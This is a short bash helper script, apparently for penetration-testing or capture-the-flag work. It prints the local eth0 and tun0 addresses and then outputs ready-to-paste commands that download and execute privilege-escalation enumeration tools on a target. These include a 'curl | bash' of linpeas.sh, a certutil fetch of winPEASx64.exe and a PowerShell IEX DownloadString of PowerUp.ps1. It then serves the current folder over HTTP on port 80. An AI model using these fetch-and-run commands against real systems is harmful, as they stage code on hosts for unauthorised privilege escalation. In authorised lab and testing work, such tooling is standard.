#!/bin/bash
eth0=`ifconfig eth0 | awk '/inet / {print $2}'`
tun0=`ifconfig tun0 | awk '/inet / {print $2}'`

echo "eth0 $eth0"
echo "tun0 $tun0"

echo -e "\n-- tun0 --\n"

echo "wget http://$tun0/linpeas.sh"
echo "curl $tun0/linpeas.sh | bash"
echo "certutil.exe -urlcache -split -f http://$tun0/winPEASx64.exe winPEASx64.exe"
echo "IEX(New-Object Net.Webclient).DownloadString('http://$tun0/PowerUp.ps1');Invoke-AllChecks"

echo -e "\n--Files--\n"

ls

echo -e "\n-- Server --\n"

python3 -m http.server 80
